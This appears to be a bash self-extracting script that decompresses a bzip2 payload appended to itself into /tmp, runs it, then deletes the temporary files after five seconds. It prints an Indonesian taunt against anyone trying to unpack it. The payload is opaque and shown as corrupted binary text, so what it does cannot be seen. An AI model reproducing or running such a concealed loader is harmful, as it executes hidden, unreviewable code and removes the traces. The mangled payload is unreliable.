#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��!� U��p� }�����������`�    h    1�2a 1�4h��h   Ҡ hi� P      �ѣh�&b��F� i��  1�2a 1�4h��h  �ѣh�&b��F� i��  R"b2��������`�����T��5�g͍�I�"?X���щB�/Չ����J�II5+4��"?)i��u	�A�� �_�u7�đ���(�)I����+h��#�{��ğ�O�a��몲�K^ﻤ�M�]<˓��/�K'��e</���hC���MĐ��C8�|Ic\�TV���BD~nX�D|��I0���L���������|��{T3�v�#�5�r�(u
Hl,d��9��I�6�c@��;f��U��ö0�L��X	.���yJ�-&}�ɊS>C��4���Y��}�DgT�}�R���V^������MÉ�ƍ��U�J�y�_�K��\�V�6��ubjT06-�(��LE��F����x����I��ر��I���w"�S�W�&sn�e�|Q?ci�n?�ɰ�w�U��tF�mOfڮ32�y������⤙��<�q����U�_��I��t�y]	�a	��$G��|?�*���lh������u}g�����ϛ�$���ԉ��D��DJ����;+w�E�I/6B��|������u�&�W!pq&7�8�~:��Z�b�a����F�u�|�������t�=��i��7��M���5��Ƶ��]�̫���S�����M�r*R���O��B�=��:��c5���V�_LoJ�SJ��e/��j��ĵl�s��>F���&���M�.�߅KJ{�3��,�r��^�/���{�*�TF�#8�mҜ-��a-)���v��Ty��S�wU�\�`�=+Ê<M��?�i9�Qu.�礸�Hz�j��5�bѵ�E[3�6��%qk�<�K��G>r�����([b�s�[,��]��<x޶F��Z����W3��b(bSL��"����v�.��_k���J�4^�)yE�]�xY#4�$`���Ű�ҡI xj!Q^X�p@L�2��z��9`n�M���&��r�Q��9����\�{�6��t���ORm���Z��GK���[b�-حZQ4ӚU
!֏J�\+^y[�#ʋqe�T̹��ST��s���v���BF�*)[���W�?����GZ�dj���{��fx�fn�L_^ʾ�IF�?[]��u�Z̍�%KT�S`��00�3�;)�MK�z�w�l���Q(�P�Ү5[R]V���Lg�2�����؞I���.�W:V�KP�M�mҋ�K��NGX��&����I$��$<�
�����%&�I48Q��Tw9�Mb���P)9Z�S��I%��6޵��m��y�E�[0���Se�f��*,b]cr��JH���5��J�o�������	�g�*e����^�b�]?	���SÏ+�[
a���2ջ�RA&�Pa�M�f���od$��m�Pj(���R��(��#]�b���j9���ZIC�m;6����8�%Uz�ݺ�j)k��b�3���!B��J
Ƣ�_O$r���s^^�1ҿ��
]�l�EƉ���^+&�{����϶��u��F�r$�PM��dm�/�bi����F����r�Ħ���08H��)�D*"���������ݵ�D�|P9(��p�G���
�"�Թ�,nY8�,b^f�푁��n�Bۊ6Ns"�ѡc;��V�G����7k���Ho$�k����Z.$�[�ϱ�4���U���"N�r��M&aC*��b������I7YT��u	�>?<繳��_�	�(�GDx"��IZ��(p�i3S�^t�*40��x&�L���
T����\K�mµ)���w���B��q�8(;#U�5����u_��١�r<,h��z��r�4E>����h/�����D��yZ�A�������$�H~l�$�q��h���H�
�$> 